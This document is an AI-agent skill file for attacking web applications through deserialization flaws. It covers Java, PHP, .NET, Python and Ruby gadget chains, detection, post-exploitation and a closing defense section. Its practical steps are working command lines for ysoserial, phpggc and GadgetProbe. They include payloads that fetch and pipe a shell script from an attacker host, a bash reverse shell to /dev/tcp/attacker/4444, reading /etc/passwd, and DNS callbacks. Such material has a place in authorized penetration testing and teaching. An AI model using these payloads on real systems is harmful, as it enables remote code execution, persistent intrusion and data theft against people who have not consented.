---
name: web-deserialization
description: "Deserialization vulnerabilities arise when an application reconstructs objects from byte streams (Java), serialized strings (PHP), Base64 blobs (.NET), or pickle data (Python) supplied by the client."
origin: openclaw
version: "0.1.21"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 6
  guide_count: 3
  owasp: "A08:2021-Software Integrity Failures"
  mitre: "T1190-Exploit Public-Facing App"
---


# Skill: Web Deserialization Attacks

> **Supplementary Files**:
> - `payloads.md` -- Deserialization payloads for Java, PHP, .NET, Python, Ruby, Jackson/Fastjson, and bypass techniques
> - `test-cases.md` -- Structured test cases covering all major deserialization attack vectors (8 test cases)
> - `guides/` -- In-depth guides for Java ysoserial, PHP phpggc, and cross-platform deserialization

## Summary

Web Deserialization skill domain covering web attack operations.

**Tools**: ysoserial, phpggc, marshalsec, ysoserial.net, gadgetprobe, jackson-deserialization

**Domain**: web-attack

**OWASP**: A08:2021-Software Integrity Failures

**MITRE ATT&CK**: T1190-Exploit Public-Facing App

## Description

Deserialization vulnerabilities arise when an application reconstructs objects from byte streams (Java), serialized strings (PHP), Base64 blobs (.NET), or pickle data (Python) supplied by the client. The root cause is that deserialization can invoke arbitrary class constructors, magic methods (`__wakeup`, `readObject`, `readResolve`), or property setters that chain together into "gadget chains" terminating in dangerous operations like `Runtime.exec()`, `file_put_contents()`, or `Process.Start()`.

These vulnerabilities are particularly dangerous because they often lead directly to unauthenticated RCE, bypass authentication mechanisms, or enable denial-of-service through resource exhaustion. Detection is challenging because serialized payloads are opaque binary or encoded data that traditional WAF rules struggle to inspect.

Key attack surfaces include:
- HTTP cookies containing serialized session data
- POST parameters with Base64-encoded object streams
- REST API endpoints accepting JSON/XML with type hints (`@class`, `__type`)
- Message queues and RPC protocols (RMI, AMQP)
- File upload handlers that deserialize embedded objects
- View state fields in web frameworks (ASP.NET `__VIEWSTATE`, JSF)

## Use Cases

1. **Java RCE via ysoserial** -- Generate CommonsCollections gadget chains to exploit Apache Commons, Spring, Hibernate, and other Java libraries
2. **PHP object injection** -- Abuse Laravel, WordPress, Magento, and custom framework gadget chains via phpggc
3. **.NET ViewState deserialization** -- Exploit machineKey disclosure or weak validation to achieve RCE via ysoserial.net
4. **Blind deserialization detection** -- Use DNS/HTTP callbacks and time delays to confirm deserialization without visible output
5. **JSON/XML deserialization** -- Exploit polymorphic deserialization in Jackson, Fastjson, and XStream
6. **Python pickle RCE** -- Craft malicious pickle payloads targeting Flask/Django session stores or IPC channels
7. **Ruby deserialization** -- Exploit ERB, Gem, and Rails gadget chains
8. **Gadget chain analysis** -- Use GadgetProbe to enumerate available classes and identify exploitable chains
9. **WAF bypass** -- Evade deserialization detection through encoding, compression, and payload obfuscation

## Core Tools

| Tool | Language | Purpose | Key Features |
|------|----------|---------|--------------|
| **ysoserial** | Java | Generate Java gadget chain payloads | 50+ gadget chains, custom command execution, file-based payloads |
| **phpggc** | PHP | Generate PHP gadget chain payloads | Laravel, WordPress, Magento, Guzzle, Monolog chains |
| **marshalsec** | Java | Deserialization research and marshalling exploits | RMI/JMX/LDAP/JRMP servers, JSON/XML marshalling |
| **ysoserial.net** | .NET | Generate .NET gadget chain payloads | ViewState, BinaryFormatter, LosFormatter, NetDataContractSerializer |
| **gadgetprobe** | Java | Enumerate classpath and identify gadget chains | DNS exfiltration, classpath mapping, chain feasibility |
| **jackson-deserialization** | Java/JSON | Jackson/Fastjson deserialization exploit toolkit | Polymorphic type handling, `@JsonTypeInfo` exploitation, CVE database |

## Methodology

### Phase 1: Detection and Fingerprinting

1. Identify serialization formats in HTTP traffic (magic bytes `0xACED` for Java, `O:` for PHP, Base64 with `AAQAA` for .NET)
2. Map input vectors: cookies, POST body, headers, file uploads, API endpoints
3. Use GadgetProbe to enumerate available classes on the target classpath via DNS callbacks
4. Confirm deserialization by injecting benign objects and observing error messages or behavior changes

### Phase 2: Gadget Chain Selection

1. Map target framework and library versions from fingerprinting data
2. Cross-reference with ysoserial/phpggc/ysoserial.net gadget chain databases
3. Select chains matching available libraries (CommonsCollections, Spring, Hibernate, etc.)
4. Consider chain reliability -- some chains are version-specific or JVM-dependent

### Phase 3: Payload Generation and Delivery

1. Generate payloads using the appropriate tool (ysoserial, phpggc, ysoserial.net)
2. Encode payload for the delivery vector (Base64, URL-encoding, gzip compression)
3. Inject payload into the identified input vector
4. Monitor for execution via OOB callbacks (DNS, HTTP) or time-based indicators

### Phase 4: Post-Exploitation

1. Confirm RCE and establish persistent access if authorized
2. Escalate from deserialization to full application compromise
3. Document chain used, libraries required, and exploit reliability

## Practical Steps

### Java Deserialization with ysoserial

```bash
# List all available gadget chains
java -jar ysoserial.jar --help

# Generate CommonsCollections5 payload for command execution
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' | base64 -w0

# Generate payload with URL-encoded output for GET parameters
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/shell.sh|bash' | base64 -w0 | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))"

# Use JRMP client for more reliable exploitation
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0

# Start a JRMP listener to serve payloads
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
```

### PHP Deserialization with phpggc

```bash
# List available gadget chains
phpggc -l

# Generate Laravel RCE1 chain
phpggc Laravel/RCE1 'system("id")'

# Generate WordPress chain with base64 wrapper
phpggc -b WordPress/Generic 'system("cat /etc/passwd")'

# URL-encode output for GET parameter injection
phpggc -u Magento/RCE2 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

### Blind Deserialization Detection

```bash
# DNS callback with GadgetProbe
java -cp gadgetprobe.jar GadgetProbe --dns-callback attacker.burpcollaborator.net --input serialized_data.bin

# Time-based detection (5-second delay)
java -jar ysoserial.jar CommonsCollections5 'sleep 5' | base64 -w0

# HTTP OOB callback
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/deser-confirm' | base64 -w0
```

## Defense Perspective

### Prevention

- **Integrity checks**: Sign serialized data with HMAC; reject data with invalid signatures
- **Type whitelisting**: Only allow deserialization of expected classes; block all others
- **Replace serialization**: Use JSON or Protocol Buffers for data interchange instead of native serialization
- **Patch libraries**: Keep all libraries updated to prevent gadget chain availability
- **Input validation**: Validate all deserialized data against a strict schema before processing
- **Sandbox**: Run deserialization in a restricted security manager or sandbox environment

### Detection

- Monitor for Java serialization magic bytes (`0xACED0005`) in HTTP traffic
- Log deserialization exceptions and class-loading errors
- Deploy RASP agents to intercept `ObjectInputStream.readObject()` calls
- Use WAF rules to detect common gadget chain class names in Base64-decoded traffic
- Alert on DNS/HTTP callbacks to known exfiltration domains during deserialization attempts

### Framework-Specific Mitigations

| Framework | Mitigation |
|-----------|-----------|
| Java | Override `ObjectInputStream.resolveClass()` with whitelist; use `SerialKiller` filter |
| PHP | Disable `unserialize()` for user input; use `json_decode()` instead |
| .NET | Set `MachineKey` validation; use `AspNetEnforceViewStateMac=true`; migrate to `DataProtector` |
| Python | Never pickle untrusted data; use `json` or `safe_load` with PyYAML |
| Jackson | Disable `DEFAULT_TYPING`; use `@JsonTypeInfo(use=Id.NAME)` with whitelist |
| Ruby | Avoid `Marshal.load` on user data; use JSON with permitted classes only |
